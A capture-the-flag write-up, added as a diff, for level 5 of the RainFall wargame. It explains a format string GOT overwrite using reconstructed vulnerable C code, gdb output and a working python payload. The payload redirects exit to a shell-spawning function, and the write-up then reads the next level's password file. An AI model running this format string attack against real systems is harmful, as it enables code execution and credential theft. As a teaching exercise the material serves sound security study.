@@ -1,0 +1,85 @@
+# Level 5 — Format String GOT Overwrite
+
+## Introduction
+This level introduces the Global Offset Table (GOT) overwrite technique. We are given a binary that reads user input into `n` and calls `exit(1)` at the end of the function, meaning we cannot hijack the standard stack return pointer. We must overwrite the GOT address of `exit` with the address of an unused function `o` that spawns a shell.
+
+## Analysis
+The reconstructed C code of the binary is:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void o(void) {
+    system("/bin/sh");
+    _exit(1);
+}
+
+void n(void) {
+    char local_20c[520];
+    fgets(local_20c, 520, stdin);
+    printf(local_20c); // Vulnerable printf
+    exit(1);
+}
+
+int main(void) {
+    n();
+    return 0;
+}
+```
+
+Since the `n` function executes `exit(1)` right after the vulnerable `printf`, it never executes a stack return (`ret`) instruction from `n`'s context. However, dynamically linked functions (like `exit`) use the Global Offset Table (GOT) to resolve their libc locations at runtime. By overwriting `exit`'s GOT entry with the address of `o`, we can hijack execution flow when `exit` is called.
+
+### Finding the GOT Entry Address of `exit`
+We disassemble the PLT stub for `exit` inside `gdb`:
+```gdb
+(gdb) disassemble exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
+   0x080483d6 <+6>:	push   0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+```
+The jump targets `0x08049838`. This is the writable GOT entry address for the `exit` function.
+
+### Finding the Address of `o`
+We use `gdb` to find the address of the `o` function:
+```gdb
+(gdb) info functions o
+All functions matching regular expression "o":
+
+Non-debugging symbols:
+0x080484a4  o
+```
+The address of `o` is `0x080484a4`, which is `134513828` in decimal.
+
+### Finding the Stack Offset
+We print a distinct marker `aaaa` followed by multiple `%x` format specifiers:
+```bash
+level5@RainFall:~$ ./level5
+aaaa %x %x %x %x %x %x
+aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
+```
+`61616161` (hex representation of `aaaa`) appears as the **4th** output. This indicates that the start of our input buffer resides at argument position **4** on the stack.
+
+### Designing the Payload
+To write `134513828` to `0x08049838`:
+1. Start the payload with the target GOT address `0x08049838` (4 bytes).
+2. Generate `134513828` total printed characters. Since the address occupies 4 bytes, we print `134513828 - 4 = 134513824` characters using the padding width specifier `%134513824d`.
+3. Use `%4$n` to write this printed count to the GOT address at position 4.
+
+## Exploit
+We generate the payload (reversing the address to little-endian representation `\x38\x98\x04\x08`):
+```bash
+python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/payload
+```
+
+Run the exploit:
+```bash
+(cat /tmp/payload; cat) | ./level5
+```
+
+Once the shell is spawned, we retrieve the password for `level6`:
+```bash
+cat /home/user/level6/.pass
+```
